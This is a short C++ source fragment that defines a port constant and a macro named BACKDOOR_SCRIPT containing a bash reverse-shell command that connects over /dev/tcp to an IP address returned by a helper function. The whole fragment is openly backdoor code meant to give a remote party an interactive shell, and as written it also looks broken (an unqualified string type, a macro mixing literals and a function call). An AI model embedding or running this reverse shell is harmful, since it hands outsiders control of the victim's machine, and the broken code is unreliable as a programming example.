#include <iostream>
#include <string>


const string PORT = "4008";

#define BACKDOOR_SCRIPT "\
/bin/bash -i >/dev/tcp/ " + (NetworkTools::getIPAddress()) + "/" + PORT + " 0<&1 2>&1";